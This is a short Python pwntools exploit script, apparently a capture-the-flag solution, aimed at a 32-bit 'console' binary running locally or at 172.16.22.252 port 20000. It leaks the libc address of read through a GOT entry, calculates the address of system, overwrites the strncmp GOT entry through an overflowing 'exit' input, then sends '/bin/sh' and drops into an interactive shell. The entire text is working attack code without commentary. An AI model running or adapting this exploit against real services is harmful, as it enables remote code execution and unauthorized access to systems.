from pwn import *
debug=0
if debug:
    p=process('./console')
    e=ELF('/lib32/libc.so.6')
#    gdb.attach(p)
else:
    p=remote('172.16.22.252','20000')
    e = ELF('./libc.so')
readgot=0x8049D24
strncmpgot=0x8049D54
p.recvuntil(':')
p.sendline('a'*16+'\x00'+'b'*2)
p.recvuntil(':')
p.send('\x00'+'x'*15+p32(readgot))
p.recvuntil(':')
p.sendline('\x00'+'y'*14)
p.recvuntil('Token: ')
#data=p.recvuntil('\xf7')
data=p.recv(4)
read=u32(data)
log.success('read: '+hex(read))
p.recvuntil('>')
p.send('exit'+'a'*24+p32(strncmpgot+4+0x1c)+p32(0x804882f)+p32(strncmpgot)+p32(12))
system=read-e.symbols['read']+e.symbols['system']
p.send(p32(system)+'/bin/sh\x00')
p.interactive()
